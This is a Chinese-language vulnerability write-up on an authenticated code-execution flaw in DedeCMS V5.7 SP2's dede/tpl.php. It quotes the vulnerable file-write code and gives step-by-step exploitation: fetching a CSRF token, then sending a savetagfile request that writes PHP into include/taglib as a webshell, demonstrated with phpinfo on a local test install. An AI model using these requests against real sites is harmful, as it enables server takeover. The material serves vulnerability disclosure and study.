## [DedeCMS V5.7 SP2后台存在代码执行漏洞](http://www.freebuf.com/vuls/164035.html)


[下载](http://www.dedecms.com/products/dedecms/downloads/)

## Affected Version 

DedeCMS V5.7 SP2

## Code analysis

#### 漏洞详情

默认后台地址 `/dede/`，文件`dede/tpl.php`中的251到281行。


	csrf_check();
		#filename和前面正则的匹配情况
	    if(!preg_match("#^[a-z0-9_-]{1,}\.lib\.php$#i", $filename))
	    {
	        ShowMsg('文件名不合法，不允许进行操作！', '-1');
	        exit();
	    }
	    require_once(DEDEINC.'/oxwindow.class.php');
		#搜索filename中匹配`\.lib\.php$#i`的部分，以空格代替
	    $tagname = preg_replace("#\.lib\.php$#i", "", $filename);
		#去掉反斜号
	    $content = stripslashes($content);
		#拼接文件名
	    $truefile = DEDEINC.'/taglib/'.$filename;
		#写入内容
	    $fp = fopen($truefile, 'w');
	    fwrite($fp, $content);
	    fclose($fp);

replace处理之后赋值给变量 $tagname 。但是写入文件的时候并没有用到$tagname 。
那为什么有这个$tagname，拼接文件名的时候，应该是拼接`tagname`

利用

	1.由于dedecms全局变量注册的特性，所以这里的content变量和filename变量可控。

	2.可以看到将content直接写入到文件中导致可以getshell。但是这里的文件名经过正则表达式，所以必须要.lib.php结尾。

	3.这里还有一个csrf_check()函数，即请求中必须要带token参数。


#### 漏洞利用

1. 首先获取`token`。访问域名 + `/dede/tpl.php?action=upload`

	view-source:http://127.0.0.1:8000/DedeCMS/uploads/dede/tpl.php?action=upload

	d170f6bed3360da62d909d28a072c312



![](http://opmi2ydgh.bkt.clouddn.com//18-3-8/56295937.jpg)

2.然后访问 

	域名 + /dede/tpl.php?filename=secnote.lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token=[你的token值



![](http://opmi2ydgh.bkt.clouddn.com//18-3-8/16267803.jpg)

shell 地址

	域名 + /include/taglib/secnote.lib.php

![](http://opmi2ydgh.bkt.clouddn.com//18-3-8/81830140.jpg)


## References

[DedeCMS V5.7 SP2后台存在代码执行漏洞](http://www.freebuf.com/vuls/164035.html)